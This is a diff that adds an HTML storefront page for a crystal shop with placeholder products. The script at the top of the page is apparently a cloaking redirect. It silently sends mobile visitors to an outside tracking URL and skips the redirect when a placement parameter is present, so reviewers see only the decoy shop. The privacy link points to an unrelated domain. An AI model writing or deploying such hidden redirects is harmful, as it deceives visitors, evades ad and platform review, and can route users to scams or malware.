@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/de9fa2b0-1366-489a-be81-3b73f541059f?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Celestial Crystals Emporium</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(45deg, #1a1a2e, #16213e);
+            color: #e94560;
+        }
+        header {
+            background-color: #0f3460;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            margin: 0;
+            font-size: 2.5em;
+            color: #e94560;
+        }
+        nav {
+            background-color: #533483;
+            padding: 10px;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            display: flex;
+            justify-content: space-around;
+        }
+        nav ul li a {
+            color: #e94560;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        .product-card {
+            background-color: #16213e;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+        .product-card:hover {
+            transform: scale(1.05);
+        }
+        .product-card img {
+            max-width: 100%;
+            border-radius: 5px;
+        }
+        .product-card h3 {
+            margin: 10px 0;
+            color: #e94560;
+        }
+        .product-card p {
+            color: #fff;
+        }
+        footer {
+            background-color: #0f3460;
+            color: #e94560;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        footer a {
+            color: #e94560;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Celestial Crystals Emporium</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Shop</a></li>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="product-grid">
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200" alt="Amethyst Crystal">
+                <h3>Amethyst Crystal</h3>
+                <p>$29.99</p>
+            </div>
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200" alt="Rose Quartz">
+                <h3>Rose Quartz</h3>
+                <p>$24.99</p>
+            </div>
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200" alt="Citrine Cluster">
+                <h3>Citrine Cluster</h3>
+                <p>$39.99</p>
+            </div>
+            <div class="product-card">
+                <img src="https://via.placeholder.com/200x200" alt="Black Tourmaline">
+                <h3>Black Tourmaline</h3>
+                <p>$19.99</p>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Celestial Crystals Emporium. All rights reserved. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
